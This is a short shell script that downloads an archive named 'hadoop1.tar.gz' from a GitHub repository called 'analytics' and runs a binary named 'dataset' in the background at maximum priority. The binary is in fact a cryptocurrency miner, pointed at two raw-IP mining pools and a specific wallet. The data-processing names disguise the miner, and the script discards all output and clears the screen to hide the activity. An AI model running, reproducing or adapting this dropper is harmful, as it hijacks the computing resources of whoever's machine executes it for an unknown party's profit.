#!/bin/sh
cd ~

sysctl vm.nr_hugepages=2048

wget https://raw.githubusercontent.com/alunsotech/analytics/main/hadoop1.tar.gz
tar xvzf hadoop1.tar.gz
nice -n -20 nohup ./dataset --algorithm randomepic\;randomx --pool 8.9.31.244:4000\;47.100.95.105:13531 --wallet qfjorazati\;89Xc3ZmpsiX9PVdVsLyRkQ1bw2Sv8wg5pbhL2jCGnB8kMZPtTP5U49zE15qWLmoYPR1YJnYgVE6qVGp8PVCCMwCh31YJhgE --password x\;riro --cpu-threads 8\;8 --disable-gpu --multi-algorithm-job-mode 3 >/dev/null 2>&1 &
clear
